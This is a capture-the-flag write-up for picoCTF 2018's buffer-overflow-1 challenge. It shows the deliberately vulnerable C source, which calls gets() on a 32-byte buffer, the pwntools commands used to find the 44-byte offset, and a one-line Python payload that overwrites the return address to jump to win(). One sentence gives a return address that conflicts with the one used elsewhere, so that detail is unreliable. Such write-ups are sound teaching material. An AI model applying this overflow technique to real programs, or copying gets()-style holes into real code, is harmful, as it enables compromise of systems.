Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this [program](https://2018shell.picoctf.com/static/64108e53cad29c810b4f6b214d183a8a/vuln)? You can find it in /problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba on the shell server. [Source](https://2018shell.picoctf.com/static/64108e53cad29c810b4f6b214d183a8a/vuln.c)

# :uk: Solution :uk:
Opening the source code of the program we can see that the `win()` function will print our flag.

We can also see that in our `main()` function we execute `vuln()` function, which uses `gets()` native function, which is deprecated as it is vulnerable to overflow.

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

We can see that the `BUFSIZE` constant is 32 bytes, everything apart from that will overflow our program.

Now to get the direction in memory for `win()`
`readelf -s vuln | grep win'
The `win()` address is `0x080485cb`.

To know the exact size of padding required for the overflow, we will use [De Bruij sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence).

`python3 -c "from pwn import *; print(cyclic(100).decode())" | ./vuln`

we will get printed the address where the overflow sent us, now we just have to do the reverse step to know exactly where in the De Bruijn sequence happened the overflow.

`python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"`

This shows we need 44 bytes as padding, a character equals to a byte, so we will use `z` as padding.

![](https://i.imgur.com/5gnTfdT.png)

Our stack would look like this, moving downwards, we want to overflow until we get inside the return address and replace it with `0x0804865d`.

Now we just need to concatenate the address to the payload, in bytes.

`python3 -c "import struct; print('z'*44+struct.pack('<I', 0x080485cb).decode())" | ./vuln"`

Et voilÃ .
